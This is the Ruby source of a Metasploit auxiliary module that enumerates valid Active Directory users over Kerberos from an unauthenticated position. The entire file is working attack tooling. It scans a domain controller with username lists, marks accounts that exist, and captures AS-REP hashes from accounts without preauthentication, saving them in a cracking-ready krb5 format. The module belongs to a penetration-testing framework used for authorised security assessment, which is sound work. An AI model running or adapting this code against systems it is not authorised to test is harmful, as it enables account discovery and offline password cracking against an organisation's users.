##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasploit/framework/credential_collection'
require 'metasploit/framework/login_scanner/kerberos'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Kerberos::Client
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Kerberos Domain User Enumeration',
        'Description' => %q{
          This module will enumerate valid Domain Users via Kerberos from an unauthenticated perspective. It utilizes
          the different responses returned by the service for valid and invalid users.
        },
        'Author' => [
          'Matt Byrne <attackdebris[at]gmail.com>', # Original Metasploit module
          'alanfoster' # Enhancements
        ],
        'References' => [
          ['URL', 'https://nmap.org/nsedoc/scripts/krb5-enum-users.html']
        ],
        'License' => MSF_LICENSE
      )
    )

    register_options(
      [
        OptString.new('DOMAIN', [ true, 'The Domain Eg: demo.local' ])
      ]
    )

    deregister_options('BLANK_PASSWORDS', 'BRUTEFORCE_SPEED', 'DB_ALL_CREDS', 'DB_ALL_PASS', 'PASSWORD', 'PASS_FILE', 'USER_AS_PASS', 'USERPASS_FILE')
  end

  def run
    domain = datastore['DOMAIN'].upcase
    print_status("Using domain: #{domain} - #{peer}...")

    cred_collection = build_credential_collection({ usernames_only: true })
    pre_auth = [build_pa_pac_request]
    scanner = ::Metasploit::Framework::LoginScanner::Kerberos.new(
      host: self.rhost,
      port: self.rport,
      server_name: "krbtgt/#{domain}",
      realm: domain.to_s,
      pa_data: pre_auth,
      cred_details: cred_collection,
      datastore: datastore
    )

    scanner.scan! do |result|
      credential_data = result.to_h

      case credential_data[:status]
      when :eof
        print_error("#{self.rhost} - User: #{credential_data[:username]} - EOF Error #{credential_data[:proof]}. Aborting...")
        # Abort
        break
      when :decode_error
        print_error("#{self.rhost} - User: #{credential_data[:username]} - Decoding Error -  #{credential_data[:proof]}. Aborting...")
        # Abort
        break
      when :wrong_realm
        print_error("#{self.rhost} - User: #{credential_data[:username]} - #{credential_data[:proof]}. Domain option may be incorrect. Aborting...")
        # Abort
        break
      when :no_preauth
        print_good("#{self.rhost} - User: #{credential_data[:username]} does not require preauthentication. Hash: #{credential_data[:hash]}")
        report_cred(
          user: credential_data[:username],
          asrep: credential_data[:hash]
        )
        break if datastore['STOP_ON_SUCCESS']
      when :present
        print_good("#{self.rhost} - User: #{credential_data[:username]} is present")
        report_cred(user: credential_data[:username])
        break if datastore['STOP_ON_SUCCESS']
      when :disabled_or_locked_out
        print_error("#{self.rhost} - User: #{credential_data[:username]} account disabled or locked out")
      when :not_found
        vprint_status("#{self.rhost} - User: #{credential_data[:username]} user not found")
      when :unknown_error
        vprint_status("#{self.rhost} - User: #{credential_data[:username]} - #{credential_data[:error_code]}")
      when :unknown_response
        vprint_status("#{self.rhost} - User: #{credential_data[:username]} - #{credential_data[:proof][:error_code]}. Unknown response #{credential_data[:proof][:repsonse]}")
      else
        print_error("#{self.rhost} - User: #{credential_data[:username]}. Unknown return status: #{credential_data[:status]}")
      end
    end
  end

  def report_cred(opts)
    domain = datastore['DOMAIN'].upcase

    service_data = {
      address: rhost,
      port: rport,
      protocol: 'tcp',
      workspace_id: myworkspace_id,
      service_name: 'kerberos',
      realm_key: ::Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN,
      realm_value: domain
    }

    credential_data = {
      username: opts[:user],
      origin_type: :service,
      module_fullname: fullname
    }.merge(service_data)

    if opts[:asrep]
      credential_data.merge!(
        private_data: opts[:asrep],
        private_type: :nonreplayable_hash,
        jtr_format: 'krb5'
      )
    end

    login_data = {
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::UNTRIED
    }.merge(service_data)

    create_credential_login(login_data)
  end
end
